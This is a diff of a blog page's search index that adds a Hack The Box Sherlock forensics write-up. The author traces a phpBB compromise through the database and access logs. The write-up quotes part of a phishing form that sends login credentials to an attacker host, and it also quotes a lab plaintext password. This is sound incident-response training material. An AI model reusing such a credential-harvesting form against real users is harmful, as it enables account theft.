@@ -20,7 +20,40 @@
 <span class=post-day>Feb 8</span></a></li></ul></div><div class=posts-group><div class=post-year>2021</div><ul class=posts-list><li class=post-item><a href=https://4wayhandshake.github.io/ctf/baby-todo-or-not-todo/><span class=post-title>baby todo or not todo</span>
 <span class=post-day>Oct 27</span></a></li><li class=post-item><a href=https://4wayhandshake.github.io/ctf/baby-waffles-order/><span class=post-title>baby WAFfles order</span>
 <span class=post-day>Oct 8</span></a></li><li class=post-item><a href=https://4wayhandshake.github.io/ctf/phonebook/><span class=post-title>Phonebook</span>
-<span class=post-day>Oct 7</span></a></li></ul></div><div class=pagination><div class=pagination__buttons></div></div></main></div><footer class=footer><script>window.store={"https://4wayhandshake.github.io/strategy/pretty-terminal/":{title:"Pretty Terminal",tags:["Zsh","Bash","Styling","Quality of Life"],categories:["Strategy","Homelab"],content:`WHY Because things are faster when they look the way you expect ’em to. It’s great when things look nice, but having a pretty terminal is just as much about functionality as it is about aesthetics.
+<span class=post-day>Oct 7</span></a></li></ul></div><div class=pagination><div class=pagination__buttons></div></div></main></div><footer class=footer><script>window.store={"https://4wayhandshake.github.io/ctf/bumblebee/":{title:"Bumblebee",tags:["Log Parsing","Log Ingestion","GoAccess"],categories:["Challenge","HTB","Sherlock","Easy"],content:`Mostly just jotting down notes with this one.
+SOLUTION Looked through database; found the phpbb_posts table
+![](found malicious post.png)
+It&rsquo;s post_id is 9. The user that submitted it is apoole1
+Take the value of that post_text field and paste it into an HTML template file. Open it in a browser and see it&rsquo;s a credential harvester
+![](malicious post.png)
+Note that it probably would have rendered normally on the target&rsquo;s computer.
+The post was just some malicious HTML. It pretends your session is expired, prompts for login, then shows you the &ldquo;real&rdquo; post after submitting the form.
+Here&rsquo;s how the source code of that login widget works:
+&lt;form action=&#34;http://10.10.0.78/update.php&#34; method=&#34;post&#34; id=&#34;login&#34; data-focus=&#34;username&#34; target=&#34;hiddenframe&#34;&gt; &lt;div class=&#34;panel&#34;&gt; ... &lt;/div&gt; &lt;/form&gt; It bounces the submission off of the attacker&rsquo;s site: http://10.10.0.78/update.php. The attacker may have used multiple IPs, but now this 10.10.0.78 is at the top of our &ldquo;Most Wanted&rdquo; list.
+We grep 10.10.0.87 access.log to see when that malicious post was made:
+10.10.0.78 - - [25/Apr/2023:13:17:22 +0100] &#34;POST /posting.php?mode=post&amp;f=2&amp;sid=a179c2e371e54de2833cec27f5cd86f5 HTTP/1.1&#34; 302 294 &#34;http://10.10.0.27/posting.php?mode=post&amp;f=2&amp;sid=a179c2e371e54de2833cec27f5cd86f5&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0&#34; Here we can see the authentication of when that user logged in to the admin panel:
+![authentication as admin](authentication as admin.png)
+Note the request where their session ID changes:
+![session id change](session id change.png)
+It all went down at 2023-04-26 11:53:12 +0100. In UTC, that&rsquo;s 26/04/2023 10:53:12
+We can also see them downloading some backup:
+![](downloading backup.png)
+HTB asks us about an LDAP password. I havent seen any, so I search the DB:
+![search db full text](search db full text.png)
+Results indicate it&rsquo;s in the phpbb_config\` table
+![](plaintext password.png)
+There it is: Passw0rd1.
+HTB also asks for the UA of the admin user. Just grep for it and exclude entries with the malicious IP:
+grep &#39;GET /adm/index.php&#39; access.log | grep -v 10.10.0.78 It&rsquo;s Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
+![](apoole1 sets self to admin.png)
+date -d @1682506431 -u # Wed 26 Apr 2023 10:53:51 AM UTC For the last flag, just grep for download and look for the file that doesnt fit:
+10.10.0.78 - - [26/Apr/2023:12:01:38 +0100] &#34;GET /store/backup_1682506471_dcsr71p7fyijoyq8.sql.gz HTTP/1.1&#34; 200 34707 &#34;-&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&#34; Although in all honesty I found it first in GoAccess:
+![](GoAccess downloading backup.png)
+Using GoAccess It&rsquo;s super easy. Just use docker or podman:
+podman run --rm -v ./access.log:/var/log/access.log -v .:/output allinurl/goaccess /var/log/access.log --log-format=COMBINED -o /output/report.html Map the access.log to the correct file, run the above, then read the output file
+firefox report.html It&rsquo;ll load up this nifty dashboard - functionality is limited but it&rsquo;s a great companion to grep
+![Dashboard](GoAccess dashboard.png)
+`,url:"https://4wayhandshake.github.io/ctf/bumblebee/"},"https://4wayhandshake.github.io/strategy/pretty-terminal/":{title:"Pretty Terminal",tags:["Zsh","Bash","Styling","Quality of Life"],categories:["Strategy","Homelab"],content:`WHY Because things are faster when they look the way you expect ’em to. It’s great when things look nice, but having a pretty terminal is just as much about functionality as it is about aesthetics.
 I just installed a new ParrotOS system and I don’t enjoy the default bash terminal they provide. Let’s add in some much-needed quality of life improvements!
 ![default bash with normal colors](default bash with normal colors.png)
 OVERVIEW If you don’t care, or don’t know enough to care, I suggest you follow my defaults outlined below. It will produce a nice starting point for customization without pigeonholing you into a particular way of doing things. We&rsquo;ll use:
